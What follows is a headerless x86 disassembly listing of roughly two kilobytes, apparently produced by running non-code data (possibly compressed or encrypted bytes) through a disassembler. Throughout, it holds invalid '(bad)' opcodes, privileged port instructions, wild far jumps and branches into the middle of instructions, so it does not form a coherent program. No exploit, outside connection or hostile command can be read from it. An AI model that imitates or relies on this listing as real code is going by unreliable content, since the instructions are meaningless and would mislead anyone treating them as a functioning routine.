  405cbf:	call   0x73da:0x6c87eefc
  405cc6:	mov    ebp,0x339c8e39
  405ccb:	jle    0x405c7b
  405ccd:	xchg   ebp,eax
  405cce:	xchg   esp,eax
  405ccf:	(bad)  
  405cd0:	mov    esi,0xe4079640
  405cd5:	push   ss
  405cd6:	cmp    ebp,esi
  405cd8:	fidivr WORD PTR [ecx]
  405cda:	mov    gs,esp
  405cdc:	or     al,0xf6
  405cde:	pushf  
  405cdf:	ss xor eax,0x8bcbb171
  405ce5:	or     ebp,DWORD PTR [edx-0x44]
  405ce8:	cmp    al,0x7f
  405cea:	cmp    BYTE PTR [ebx+0x7e],al
  405ced:	leave  
  405cee:	and    al,0x62
  405cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cf1:	jb     0x405d4f
  405cf3:	sub    al,0x27
  405cf5:	jmp    0x76dd2609
  405cfa:	or     BYTE PTR [ecx+0x29d58ddf],cl
  405d00:	xchg   esi,eax
  405d01:	popa   
  405d02:	inc    edx
  405d03:	adc    ecx,DWORD PTR [eax+eax*2+0x382d31f6]
  405d0a:	lods   al,BYTE PTR ds:[esi]
  405d0b:	xchg   ebp,eax
  405d0c:	enter  0x911d,0x95
  405d10:	cmc    
  405d11:	les    ecx,FWORD PTR [ebp+0x78ae470f]
  405d17:	and    esi,DWORD PTR [edx-0x7d48a9e3]
  405d1d:	enter  0xb6b,0x28
  405d21:	add    bl,BYTE PTR [ebx-0x4c1090b]
  405d27:	xor    ecx,DWORD PTR [ecx-0x5d]
  405d2a:	push   0xffffffc8
  405d2c:	dec    ecx
  405d2d:	mov    ds:0x5a4fab7a,al
  405d32:	xor    bh,BYTE PTR [edi-0x6c]
  405d35:	push   ecx
  405d36:	push   0xff0a6c81
  405d3b:	jmp    0x15be0e2f
  405d40:	jle    0x405ce0
  405d42:	push   ecx
  405d43:	mov    eax,ds:0xdafcfa3e
  405d48:	ja     0x405d43
  405d4a:	fdivr  DWORD PTR [esi]
  405d4c:	push   ecx
  405d4d:	arpl   WORD PTR [edx],cx
  405d4f:	dec    esp
  405d50:	add    DWORD PTR [esi],ecx
  405d52:	add    DWORD PTR [ecx+eiz*2+0x4976cb7c],edx
  405d59:	fldcw  WORD PTR [edi]
  405d5b:	out    0x6d,al
  405d5d:	inc    edx
  405d5e:	dec    eax
  405d5f:	dec    esp
  405d60:	dec    esp
  405d61:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405d63:	mov    eax,0x48cefb8e
  405d68:	pop    es
  405d69:	push   ds
  405d6a:	mov    ah,0xe4
  405d6c:	pop    ebp
  405d6d:	es xchg esp,eax
  405d6f:	lock mov DWORD PTR [ecx+0x19],ebx
  405d73:	cmp    DWORD PTR [esi],edi
  405d75:	and    DWORD PTR [esi],eax
  405d77:	loop   0x405d20
  405d79:	jno    0x405d4f
  405d7b:	retf   0x88d
  405d7e:	pop    edx
  405d7f:	lods   al,BYTE PTR ds:[esi]
  405d80:	and    eax,0x33da7d33
  405d85:	adc    DWORD PTR [ecx-0x42ca858f],ecx
  405d8b:	mov    cl,0x9c
  405d8d:	(bad)  
  405d8e:	ins    DWORD PTR es:[edi],dx
  405d8f:	pop    es
  405d90:	sahf   
  405d91:	cs ins DWORD PTR es:[edi],dx
  405d93:	pop    esp
  405d94:	jmp    DWORD PTR [edx]
  405d96:	es cs sub ebx,ebp
  405d9a:	push   es
  405d9b:	mov    DWORD PTR [ebx],edi
  405d9d:	jae    0x405d68
  405d9f:	imul   esi,DWORD PTR [ebx+0x5],0xaa379892
  405da6:	retf   
  405da7:	das    
  405da8:	mov    cl,0xb9
  405daa:	inc    ebx
  405dab:	cmp    eax,0x1084a607
  405db0:	ss in  eax,0xd7
  405db3:	add    BYTE PTR [edx-0x38b42692],dh
  405db9:	or     al,0x9d
  405dbb:	imul   edi,DWORD PTR [eax-0x1378190b],0x41
  405dc2:	out    dx,eax
  405dc3:	add    al,0x19
  405dc5:	pop    edi
  405dc6:	or     edi,DWORD PTR [edx+0xd]
  405dc9:	and    BYTE PTR ds:0x6703b5f6,dl
  405dcf:	inc    edx
  405dd0:	in     al,0x7
  405dd2:	sti    
  405dd3:	push   edx
  405dd4:	mov    cl,0xc
  405dd6:	repnz xlat BYTE PTR ds:[ebx]
  405dd8:	push   ebp
  405dd9:	mov    bl,0xd2
  405ddb:	leave  
  405ddc:	es mov esi,0x8900b9c0
  405de2:	ret    0xbb52
  405de5:	cmp    bh,BYTE PTR [ecx+0x44f62490]
  405deb:	xchg   ebx,eax
  405dec:	inc    edi
  405ded:	push   0x53694129
  405df2:	push   ebx
  405df3:	sub    al,0xce
  405df5:	lods   eax,DWORD PTR ds:[esi]
  405df6:	(bad)  
  405df7:	mov    bh,0x26
  405df9:	mov    al,ch
  405dfb:	or     eax,0x2429ac4e
  405e00:	loop   0x405dad
  405e02:	jmp    0x405df1
  405e04:	xchg   edi,eax
  405e05:	pop    es
  405e06:	cmp    eax,DWORD PTR [eax]
  405e08:	ret    0xb6af
  405e0b:	(bad)  
  405e0c:	mov    ecx,0x21390181
  405e11:	shl    DWORD PTR [edi+0x1feaa65b],cl
  405e17:	(bad)  
  405e18:	(bad)  
  405e19:	xchg   edi,eax
  405e1a:	mov    dh,0x8c
  405e1c:	sbb    ch,BYTE PTR [ebp+0x3e]
  405e1f:	pop    eax
  405e20:	cmp    eax,0x997023da
  405e25:	xchg   ecx,edi
  405e27:	xor    BYTE PTR [esi-0x472cc81f],0x74
  405e2e:	es sbb al,0x7c
  405e31:	add    BYTE PTR [ebx+0x220239bd],cl
  405e37:	sbb    al,0xa7
  405e39:	retf   
  405e3a:	sbb    BYTE PTR [ecx+eiz*8],bh
  405e3d:	repnz mov dh,0x9f
  405e40:	jo     0x405dcd
  405e42:	inc    ebx
  405e43:	(bad)  
  405e44:	or     BYTE PTR [eax+0x24],bl
  405e47:	add    al,0x28
  405e49:	mov    ebx,0x52863041
  405e4e:	adc    ebp,ecx
  405e50:	add    BYTE PTR [eax+0x1ea74ce8],ch
  405e56:	sbb    BYTE PTR [esi],dl
  405e58:	pusha  
  405e59:	fdivr  DWORD PTR [esp+edi*1]
  405e5c:	jg     0x405edd
  405e5e:	call   0x6d6ca9e0
  405e63:	je     0x405e4a
  405e65:	inc    ecx
  405e66:	pusha  
  405e67:	out    0xd,eax
  405e69:	add    BYTE PTR [esi+0x515a6a21],cl
  405e6f:	and    al,BYTE PTR [edi+0x72]
  405e72:	paddd  mm6,QWORD PTR cs:[ebx]
  405e76:	pop    ecx
  405e77:	test   al,0xd1
  405e79:	mov    edx,0xd3a4736a
  405e7e:	fsubp  st(1),st
  405e80:	pop    edi
  405e81:	mov    DWORD PTR [ebx+0x52473733],ecx
  405e87:	fs push cs
  405e89:	xchg   ecx,eax
  405e8a:	loop   0x405e24
  405e8c:	add    al,0x99
  405e8e:	in     eax,0xbd
  405e90:	push   0x802d2ef0
  405e95:	test   DWORD PTR [ebp+0x45d946a7],0x166a1e09
  405e9f:	retf   0x6d77
  405ea2:	mov    cl,0x4b
  405ea4:	pushf  
  405ea5:	cli    
  405ea6:	sub    eax,0x4694a286
  405eab:	push   0xffffffe8
  405ead:	adc    dh,dl
  405eaf:	adc    eax,0xafc7c5ee
  405eb4:	and    DWORD PTR [eax],edx
  405eb6:	lds    ebp,FWORD PTR [ebp-0x6e]
  405eb9:	fnstcw WORD PTR [esi]
  405ebb:	push   ecx
  405ebc:	sbb    dl,BYTE PTR [edx-0x55627d52]
  405ec2:	or     ebx,DWORD PTR [ebx+eax*1-0x53f34fa]
  405ec9:	out    dx,al
  405eca:	shl    BYTE PTR [edx+0x1d],cl
  405ecd:	frstor [eax+0x1ebf341f]
  405ed3:	add    ecx,ebx
  405ed5:	scas   al,BYTE PTR es:[edi]
  405ed6:	mov    eax,DWORD PTR [eax+esi*8]
  405ed9:	lds    ebp,FWORD PTR [ebx+0x339c0b62]
  405edf:	je     0x405ed6
  405ee1:	xchg   BYTE PTR [esi+0x36],al
  405ee4:	mov    dl,0x52
  405ee6:	lahf   
  405ee7:	jl     0x405f62
  405ee9:	fcomp  DWORD PTR [edx-0x2e]
  405eec:	inc    esi
  405eed:	out    dx,al
  405eee:	inc    edx
  405eef:	ss (bad) 
  405ef1:	das    
  405ef2:	inc    esp
  405ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ef4:	(bad)  [edx]
  405ef6:	or     DWORD PTR [esi-0x638ccbab],ecx
  405efc:	push   ebx
  405efd:	pop    edx
  405efe:	mov    bh,0xe7
  405f01:	pop    ebx
  405f02:	sahf   
  405f03:	stos   BYTE PTR es:[edi],al
  405f04:	mov    BYTE PTR [ecx-0x7698ad89],0xfd
  405f0b:	dec    edi
  405f0c:	sbb    BYTE PTR [eax-0x3e87b0dc],dh
  405f12:	les    edx,FWORD PTR [esi+0x18ea077f]
  405f18:	xchg   ecx,eax
  405f19:	int3   
  405f1a:	retf   
  405f1b:	xlat   BYTE PTR ds:[ebx]
  405f1c:	push   esp
  405f1d:	pop    ebx
  405f1e:	and    BYTE PTR [esi],0xaf
  405f21:	psubq  mm1,mm7
  405f24:	lock mov ecx,0x6453d438
  405f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f2b:	std    
  405f2c:	sbb    edx,DWORD PTR [edi-0x6a]
  405f2f:	pop    ss
  405f30:	mov    bh,0x6c
  405f32:	jne    0x405f2f
  405f34:	mov    ds:0xcc179d40,eax
  405f39:	xor    BYTE PTR ds:0x4fb0012a,0xa6
  405f40:	jns    0x405edc
  405f42:	pop    ecx
  405f43:	addr16 sbb ebx,ebp
  405f46:	outs   dx,DWORD PTR ds:[esi]
  405f47:	or     DWORD PTR [ebx],eax
  405f49:	out    0xee,al
  405f4b:	jne    0x405f0a
  405f4d:	fdiv   st(5),st
  405f4f:	sti    
  405f50:	dec    bl
  405f52:	aad    0xb7
  405f54:	(bad)  
  405f56:	mov    dl,0xfc
  405f58:	xor    BYTE PTR [edx+0x44],cl
  405f5b:	int    0x87
  405f5d:	test   BYTE PTR [eax-0x6c],ah
  405f60:	sub    ch,cl
  405f62:	hlt    
  405f63:	lods   eax,DWORD PTR ds:[esi]
  405f64:	mov    dl,0x60
  405f66:	sub    bh,BYTE PTR [ebp+0x43]
  405f69:	mov    ds:0x33cbb887,eax
  405f6e:	subps  xmm5,XMMWORD PTR [esi]
  405f71:	pusha  
  405f72:	sbb    DWORD PTR [edi+0x100dd27],ebx
  405f78:	ds cli 
  405f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f7b:	icebp  
  405f7c:	lds    ebx,FWORD PTR [eax-0x5e]
  405f7f:	out    0x8d,eax
  405f81:	std    
  405f82:	popf   
  405f83:	jecxz  0x405f31
  405f85:	sub    cl,0x93
  405f88:	(bad)  
  405f89:	pop    edx
  405f8a:	aaa    
  405f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8c:	push   0xedf67add
  405f91:	div    DWORD PTR [edx]
  405f93:	or     ebx,ebp
  405f95:	scas   eax,DWORD PTR es:[edi]
  405f96:	ds pop edi
  405f98:	dec    ebx
  405f99:	and    eax,0xa2a5951c
  405f9e:	pop    ds
  405f9f:	stos   DWORD PTR es:[edi],eax
  405fa0:	stc    
  405fa1:	shl    ecx,0xef
  405fa4:	ins    BYTE PTR es:[edi],dx
  405fa5:	retf   0x51de
  405fa8:	xor    DWORD PTR [esi],ebp
  405faa:	lahf   
  405fab:	dec    edx
  405fac:	mov    esi,0x30e1cbcf
  405fb1:	js     0x405ffc
  405fb3:	mov    cs,WORD PTR [ebp+0x6b]
  405fb6:	add    edx,DWORD PTR [eax-0x67819f0c]
  405fbc:	repz xchg esi,eax
  405fbe:	icebp  
  405fbf:	adc    ebx,DWORD PTR [ecx+eax*8+0x16]
  405fc3:	cmp    esp,DWORD PTR [edi]
  405fc5:	sub    BYTE PTR [esi-0x37],0x31
  405fc9:	push   ebp
  405fca:	and    esi,esi
  405fcc:	dec    esp
  405fcd:	push   0xea1f3fd5
  405fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd3:	stos   BYTE PTR es:[edi],al
  405fd4:	in     eax,dx
  405fd5:	cwde   
  405fd6:	rcl    BYTE PTR [edi-0x4c],1
  405fd9:	imul   esp,DWORD PTR [edx],0x2ac2c7c4
  405fdf:	aas    
  405fe0:	cld    
  405fe1:	das    
  405fe2:	push   0x5f
  405fe4:	inc    edi
  405fe5:	inc    ebx
  405fe6:	jle    0x405fb7
  405fe8:	cs push ss
  405fea:	or     DWORD PTR [eax],edx
  405fec:	fldcw  WORD PTR [eax+0x4b]
  405fef:	pop    edi
  405ff0:	js     0x405fee
  405ff2:	sbb    al,0x16
  405ff4:	les    edx,FWORD PTR [ebp-0x74b5766f]
  405ffa:	xchg   ecx,eax
  405ffb:	jecxz  0x40602d
  405ffd:	pop    ss
  405ffe:	into   
  405fff:	out    dx,al
  406000:	mov    cl,0xe
  406002:	test   al,0xdb
  406004:	mov    esi,0x7c1418fe
  406009:	(bad)  [eax+0x5648c009]
  40600f:	sbb    al,0x63
  406011:	retf   
  406012:	push   ebx
  406013:	leave  
  406014:	ffreep st(6)
  406016:	bnd jo 0x406051
  406019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40601a:	jne    0x406087
  40601c:	mov    esp,0x5f91b1fa
  406021:	jbe    0x406013
  406023:	inc    ebp
  406024:	inc    eax
  406025:	shr    ebp,1
  406027:	pmulhuw mm2,QWORD PTR [edx+0x75ec5e7d]
  40602e:	fwait
  40602f:	xor    eax,0x904eafdf
  406034:	sbb    eax,0x59038d10
  406039:	push   edi
  40603a:	fs ja  0x40607a
  40603d:	push   edi
  40603e:	lods   al,BYTE PTR ds:[esi]
  40603f:	sti    
  406040:	(bad)  
  406041:	mov    ch,0xb2
  406043:	cmc    
  406044:	xchg   edi,eax
  406045:	out    dx,eax
  406046:	jg     0x4060b9
  406048:	std    
  406049:	xor    DWORD PTR [ebp-0x73f44fa1],edx
  40604f:	xchg   ebx,eax
  406050:	xor    bl,BYTE PTR ds:0xd641132a
  406056:	and    ch,bh
  406058:	gs push edi
  40605a:	jp     0x406052
  40605c:	xchg   cl,dh
  40605e:	or     ecx,DWORD PTR [ebp-0x1]
  406061:	mov    dl,0xe8
  406063:	hlt    
  406064:	xchg   edi,eax
  406065:	mov    ebp,0x4fd719c4
  40606a:	adc    bh,bl
  40606c:	adc    DWORD PTR [ecx-0x3c45c1af],edx
  406072:	repnz popf 
  406074:	mov    ebx,0xb4f4ac5d
  406079:	clc    
  40607a:	add    al,BYTE PTR [eax+ecx*2-0x2b]
  40607e:	inc    ebx
  40607f:	fld    st(7)
  406081:	call   0x55d9fba
  406086:	xor    edx,DWORD PTR [edi]
  406088:	(bad)  
  406089:	pop    ebx
  40608a:	or     al,0x32
  40608c:	jmp    0x40604f
  40608e:	inc    ecx
  40608f:	mov    DWORD PTR [edx],0x3afd5552
  406095:	pushf  
  406096:	push   edi
  406097:	dec    eax
  406098:	jae    0x4060a0
  40609a:	fist   WORD PTR [esi]
  40609c:	and    eax,DWORD PTR [edi-0x63]
  40609f:	aas    
  4060a0:	jb     0x4060d2
  4060a2:	and    eax,0xbf5842e6
  4060a7:	out    dx,al
  4060a8:	and    al,0x9a
  4060aa:	pop    ebx
  4060ab:	cs jg  0x4060d7
  4060ae:	xor    al,0x2a
  4060b0:	out    0x8a,eax
  4060b2:	popa   
  4060b3:	inc    esp
  4060b4:	shl    DWORD PTR [eax-0x19ef908d],cl
  4060ba:	std    
  4060bb:	or     DWORD PTR [edi-0x51],ecx
  4060be:	mov    ch,0xe6
  4060c0:	int3   
  4060c1:	cdq    
  4060c2:	pop    ebx
  4060c3:	lods   al,BYTE PTR ds:[esi]
  4060c4:	mov    eax,0xf73d4227
  4060c9:	fsubrp st(7),st
  4060cb:	cmp    DWORD PTR [edi],esi
  4060cd:	pop    ds
  4060ce:	cwde   
  4060cf:	cwde   
  4060d0:	(bad)  
  4060d1:	push   esi
  4060d2:	xor    ebp,DWORD PTR [edx]
  4060d4:	mov    ecx,0xd24b9bb3
  4060d9:	sbb    dl,BYTE PTR [esi+0x7a67de76]
  4060df:	mov    eax,0x43ee851d
  4060e4:	scas   al,BYTE PTR es:[edi]
  4060e5:	cwde   
  4060e6:	in     al,dx
  4060e7:	push   esi
  4060e8:	push   ebx
  4060e9:	int    0xc2
  4060eb:	jmp    0xc3b2:0x9c5abb3f
  4060f2:	es icebp 
  4060f4:	jb     0x4060f5
  4060f6:	loopne 0x4060c9
  4060f8:	fdiv   DWORD PTR gs:[edx]
  4060fb:	dec    ebp
  4060fc:	fwait
  4060fd:	and    esp,DWORD PTR [ecx+0x8d2a97b]
  406103:	and    ebx,DWORD PTR [edx+edx*2-0x7f6704df]
  40610a:	cmp    bl,BYTE PTR ds:0x64bf1df
  406110:	pop    edx
  406111:	iret   
  406112:	inc    eax
  406113:	pop    ebx
  406114:	inc    ebp
  406115:	sbb    DWORD PTR [ebp-0x64],0x2957a756
  40611c:	fsub   DWORD PTR [esp+0x48]
  406120:	cli    
  406121:	imul   eax,DWORD PTR [esi],0x2
  406124:	int3   
  406125:	fcomp  st(2)
  406127:	enter  0xf1e8,0x34
  40612b:	scas   al,BYTE PTR es:[edi]
  40612c:	xchg   esi,eax
  40612d:	out    0x3b,al
  40612f:	test   al,0xb1
  406131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406132:	push   ecx
  406133:	sbb    BYTE PTR [edi],ah
  406135:	in     eax,0x91
  406137:	ror    DWORD PTR [eax],cl
  406139:	xchg   ebp,eax
  40613a:	jbe    0x4060d2
  40613c:	jp     0x4060fc
  40613e:	aaa    
  40613f:	push   edx
  406140:	not    DWORD PTR [ecx+0xe7facdf]
  406146:	cmc    
  406147:	lahf   
  406148:	inc    ecx
  406149:	sbb    DWORD PTR [eax],ecx
  40614b:	clc    
  40614c:	adc    BYTE PTR [edi-0x32],dl
  40614f:	test   DWORD PTR [edi],esp
  406151:	push   esi
  406152:	outs   dx,BYTE PTR ds:[esi]
  406153:	push   ss
  406154:	loopne 0x4061bb
  406156:	mov    al,0x9d
  406158:	scas   al,BYTE PTR es:[edi]
  406159:	aaa    
  40615a:	xor    DWORD PTR [edx+esi*2],esi
  40615d:	xor    ecx,0xe1a16d41
  406163:	aam    0x2d
  406165:	imul   esp,eax,0xd015e755
  40616b:	lods   al,BYTE PTR ds:[esi]
  40616c:	jno    0x544e190f
  406172:	inc    eax
  406173:	popa   
  406174:	mov    bh,0x84
  406176:	adc    eax,0x6006523a
  40617b:	retf   
  40617c:	pop    edx
  40617d:	sbb    ebx,DWORD PTR [ebx]
  40617f:	loopne 0x406115
  406181:	cdq    
  406182:	push   0xe61b088
  406187:	mov    ecx,0xfbbe64e7
  40618c:	je     0x406116
  40618e:	aam    0xd3
  406190:	fs push esp
  406192:	xor    al,0x7c
  406194:	in     al,dx
  406195:	ficom  DWORD PTR ss:[eax-0x629678e5]
  40619c:	jl     0x40611e
  40619e:	bound  ecx,QWORD PTR [esi-0x7d0004da]
  4061a4:	mov    ?,WORD PTR [ebx+ebp*8+0x5c8bb018]
  4061ab:	fmul   QWORD PTR [edx+0xb885d77]
  4061b1:	in     al,dx
  4061b2:	xlat   BYTE PTR ds:[ebx]
  4061b3:	rcl    BYTE PTR [eax+0x1f854938],0xe7
  4061ba:	cdq    
  4061bb:	in     al,dx
  4061bc:	hlt    
  4061bd:	pushf  
  4061be:	dec    esp
  4061bf:	ins    BYTE PTR es:[edi],dx
  4061c0:	aas    
  4061c1:	inc    esi
  4061c2:	mov    bh,0x5a
  4061c4:	out    0x1d,al
  4061c6:	push   ecx
  4061c7:	or     eax,0x17bced70
  4061cc:	sahf   
  4061cd:	arpl   WORD PTR [ebx+esi*1+0x7c],bx
  4061d1:	push   0x10365de0
  4061d6:	lods   eax,DWORD PTR ds:[esi]
  4061d7:	push   esi
  4061d8:	out    0x8,eax
  4061da:	pop    ebx
  4061db:	daa    
  4061dc:	xchg   ecx,eax
  4061dd:	fmul   DWORD PTR [ecx]
  4061df:	cmp    esi,ebx
  4061e1:	out    0x10,eax
  4061e3:	outs   dx,DWORD PTR ds:[esi]
  4061e4:	int    0x79
  4061e6:	jns    0x4061ae
  4061e8:	(bad)  
  4061e9:	cld    
  4061ea:	jecxz  0x406260
  4061ec:	bound  edi,QWORD PTR [esi-0x34]
  4061ef:	lods   eax,DWORD PTR ds:[esi]
  4061f0:	in     al,0x8
  4061f2:	imul   esi,DWORD PTR [edi],0xffffff9f
  4061f5:	cli    
  4061f6:	in     al,dx
  4061f7:	repz test DWORD PTR [edx-0x5ceca68d],esp
  4061fe:	das    
  4061ff:	add    bl,ch
  406201:	pop    DWORD PTR [ebp+0x23]
  406204:	and    DWORD PTR [ebx+0x73],edi
  406207:	inc    eax
  406208:	wbinvd 
  40620a:	pusha  
  40620b:	pop    ds
  40620c:	inc    ebp
  40620d:	dec    ebx
  40620e:	mov    ds:0x968ed5f2,al
  406213:	mov    esi,0x5338d7d4
  406218:	xchg   edx,eax
  406219:	or     DWORD PTR [edi+0x5789ae53],esi
  40621f:	jns    0x40622d
  406221:	sbb    eax,0xe57304ef
  406226:	push   cs
  406227:	clc    
  406228:	cs mov dl,0xd1
  40622b:	pop    esi
  40622c:	add    BYTE PTR [ecx],bh
  40622e:	xlat   BYTE PTR ds:[ebx]
  40622f:	mov    edx,0xa7e98b38
  406234:	dec    eax
  406235:	test   DWORD PTR [esi-0x24],esp
  406238:	test   DWORD PTR [esi+edx*2-0x1f315e14],0x14f3c406
  406243:	cmp    cl,bh
  406245:	inc    DWORD PTR [esp+0x1a]
  406249:	(bad)  
  40624a:	rcl    ch,1
  40624c:	push   edi
  40624d:	push   esp
  40624e:	mov    bl,BYTE PTR [edx]
  406250:	fs cdq 
  406252:	jnp    0x4061df
  406254:	cmp    al,0x42
  406256:	dec    edi
  406257:	sbb    al,dl
  406259:	punpckhdq mm6,QWORD PTR [edx+0x549a2655]
  406260:	push   esp
  406261:	repz xchg ebx,eax
  406263:	fsubr  QWORD PTR [ebx]
  406265:	push   0xffffffd2
  406267:	jmp    0x9488:0xa4a7f752
  40626e:	fs inc ebp
  406270:	shr    BYTE PTR [edx+0x4d],cl
  406273:	mov    esp,edx
  406275:	dec    esp
  406276:	jns    0x4062bd
  406278:	fmul   QWORD PTR [ecx]
  40627a:	mov    esi,0xa09b8447
  40627f:	dec    edx
  406280:	xor    esp,eax
  406282:	in     eax,dx
  406283:	sbb    bh,BYTE PTR [eax+edx*4]
  406286:	ins    BYTE PTR es:[edi],dx
  406287:	inc    esp
  406288:	mov    eax,ds:0x50a5443d
  40628d:	mov    cl,0x3b
  40628f:	shl    DWORD PTR [esi+0x8],cl
  406292:	add    DWORD PTR ds:0xf2199bcd,edi
  406298:	cmp    DWORD PTR [ebp+0x1ef580bf],ebx
  40629e:	(bad)  
  4062a0:	xchg   edi,eax
  4062a1:	jo     0x4062b5
  4062a3:	cwde   
  4062a4:	inc    ebp
  4062a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062a6:	stos   BYTE PTR es:[edi],al
  4062a7:	pop    es
  4062a8:	fisubr DWORD PTR [edi+0x31]
  4062ab:	jg     0x4062d4
  4062ad:	shl    ecx,0x27
  4062b0:	ud1    esp,DWORD PTR [ebp+0x44250c2b]
  4062b7:	dec    edx
  4062b8:	lds    ebx,FWORD PTR [ecx+0x70c3cc6b]
  4062be:	xchg   esp,eax
  4062bf:	lds    esp,FWORD PTR [ebx+0x50]
  4062c2:	js     0x4062b7
  4062c4:	push   0x75
  4062c6:	pop    edi
  4062c7:	jb     0x4062e6
  4062c9:	or     BYTE PTR [edx],al
  4062cb:	xchg   BYTE PTR [edx-0x2893c502],ch
  4062d1:	inc    ecx
  4062d2:	mov    edi,0x723161f1
  4062d7:	inc    esp
  4062d8:	fmul   QWORD PTR [edx+0x14246a8d]
  4062de:	adc    al,0x1e
  4062e0:	adc    dh,cl
  4062e2:	ss jecxz 0x4062e5
  4062e5:	(bad)  
  4062e6:	jge    0x40633c
  4062e8:	(bad)  
  4062e9:	xchg   esi,eax
  4062ea:	or     esp,DWORD PTR [esi]
  4062ec:	cmp    esi,esi
  4062ee:	sub    BYTE PTR [eax-0x38],cl
  4062f1:	mov    BYTE PTR [edi+ebx*4+0x46],dh
  4062f5:	jg     0x4062ad
  4062f7:	je     0x4062ee
  4062f9:	arpl   WORD PTR [edi],cx
  4062fb:	sti    
  4062fc:	and    al,0xf8
  4062fe:	dec    esp
  4062ff:	js     0x4062a9
  406301:	mov    BYTE PTR [eax+eax*4-0x4174a64c],dh
  406308:	add    dh,BYTE PTR [edx]
  40630a:	ret    
  40630b:	add    bh,BYTE PTR [ebp-0x73]
  40630e:	loop   0x406386
  406310:	hlt    
  406311:	icebp  
  406312:	lds    eax,FWORD PTR [edx]
  406314:	sahf   
  406315:	jnp    0x4062ca
  406317:	dec    eax
  406318:	(bad)  
  406319:	mov    cl,BYTE PTR [ebx]
  40631b:	sbb    DWORD PTR [ebp+0x44491a3a],esi
  406321:	inc    ecx
  406322:	mov    bh,0x2
  406324:	ds push es
  406326:	mov    BYTE PTR [ebx-0x3d],cl
  406329:	cmp    esp,0x61
  40632c:	gs test al,0x69
  40632f:	aad    0xa4
  406331:	pop    ebx
  406332:	arpl   WORD PTR [eax-0x5d],si
  406335:	or     BYTE PTR [ebx-0x69255840],cl
  40633b:	cmp    ecx,DWORD PTR [eax+ebp*1-0x67718e44]
  406342:	mov    BYTE PTR [ebp+0x6b],0xfa
  406346:	mov    edx,0x45a5fd70
  40634b:	sar    BYTE PTR gs:[ebp+0x7],0x1
  406350:	sahf   
  406351:	test   edx,esp
  406353:	loop   0x406336
  406355:	out    dx,eax
  406356:	dec    esp
  406357:	or     dh,BYTE PTR [ebx+0x4f]
  40635a:	test   BYTE PTR [ecx-0x1e135e4d],al
  406360:	push   esi
  406361:	das    
  406362:	jmp    0xfafdc76f
  406367:	jl     0x4063d5
  406369:	popa   
  40636a:	pop    ss
  40636b:	xor    BYTE PTR [ebx-0x41],0xa5
  40636f:	into   
  406370:	mov    dl,cl
  406372:	pop    ebp
  406373:	(bad)  
  406375:	jo     0x406334
  406377:	dec    ebp
  406378:	mov    eax,ds:0x8e5decde
  40637d:	cs out dx,al
  40637f:	and    BYTE PTR [edx],bl
  406381:	fadd   st,st(6)
  406383:	xor    al,0xf7
  406385:	and    eax,0x4ebe6f6a
  40638a:	xchg   ecx,eax
  40638b:	gs jge 0x40635c
  40638e:	mov    dh,0x6b
  406390:	mov    DWORD PTR [esi+0x7a607bba],ebx
  406396:	mov    al,ds:0x70b04698
  40639b:	ret    0xd5d2
  40639e:	cwde   
  40639f:	cwde   
  4063a0:	jmp    0x8dd:0x9d0d2c10
  4063a7:	jmp    0x4063e8
  4063a9:	aas    
  4063aa:	es es stos BYTE PTR es:[edi],al
  4063ad:	ret    
  4063ae:	retf   0x95a4
  4063b1:	popa   
  4063b2:	jg     0x406397
  4063b4:	stos   BYTE PTR es:[edi],al
  4063b5:	hlt    
  4063b6:	inc    esp
  4063b7:	test   ch,al
  4063b9:	xchg   ebx,eax
  4063ba:	popf   
  4063bb:	mov    al,0x1b
  4063bd:	or     BYTE PTR [ebx],ch
  4063bf:	in     al,dx
  4063c0:	cmp    ch,BYTE PTR [ebp+0x10]
  4063c3:	inc    edi
  4063c4:	addr16 add eax,0x1261e38d
  4063ca:	xchg   DWORD PTR [edx+edx*1+0x33906ed4],edi
  4063d1:	in     al,dx
  4063d2:	sub    esp,DWORD PTR [ecx]
  4063d4:	sub    eax,0xa5dd4185
  4063d9:	repz stc 
  4063db:	jle    0x406445
  4063dd:	xchg   edi,eax
  4063de:	retf   
  4063df:	nop
  4063e0:	xchg   esp,eax
  4063e1:	aaa    
  4063e2:	or     edx,DWORD PTR [ecx-0x30]
  4063e5:	retf   
  4063e6:	inc    edi
  4063e7:	add    ah,bh
  4063e9:	or     ebx,DWORD PTR [esi-0x287216a7]
  4063ef:	rcl    dl,1
  4063f1:	push   ebp
  4063f2:	jp     0x40637e
  4063f4:	mov    ds,WORD PTR [esi-0x4f]
  4063f7:	mov    ds:0x3b30035e,al
  4063fc:	push   edi
  4063fd:	fs js  0x406460
  406400:	push   edx
  406401:	cbw    
  406403:	cmp    edx,eax
  406405:	cmp    eax,0x5a8faac9
  40640a:	fs jmp 0x406471
  40640d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40640e:	jmp    0x75c01293
  406413:	aaa    
  406414:	xchg   ecx,eax
  406415:	mov    BYTE PTR [ebx-0x3ed603a8],ah
  40641b:	or     DWORD PTR [esi-0x76],esp
  40641e:	int3   
  40641f:	pop    ds
  406420:	push   es
  406421:	lods   al,BYTE PTR ds:[esi]
  406422:	gs push esp
  406424:	daa    
  406425:	dec    eax
  406426:	pop    esp
  406427:	inc    esp
  406428:	loope  0x406401
  40642a:	clc    
  40642b:	pop    es
  40642c:	mov    edi,0xe02cf09e
  406431:	in     al,dx
  406432:	loop   0x406427
  406434:	jb     0x406498
  406436:	nop
  406437:	in     eax,0x65
  406439:	pop    edx
  40643a:	or     BYTE PTR [ebx],cl
  40643c:	dec    esp
  40643d:	xchg   ebp,eax
  40643e:	dec    ecx
  40643f:	fld    TBYTE PTR [edx]
  406441:	sti    
  406442:	enter  0x37b5,0x42
  406446:	adc    BYTE PTR [eax+0x18],dl
  406449:	stos   BYTE PTR es:[edi],al
  40644a:	sub    al,0xa3
  40644c:	push   ebp
  40644d:	push   0xdd47ac89
  406452:	adc    al,0x1
  406454:	adc    al,0x56
  406456:	sbb    eax,0x66a3ffc0
  40645b:	dec    ecx
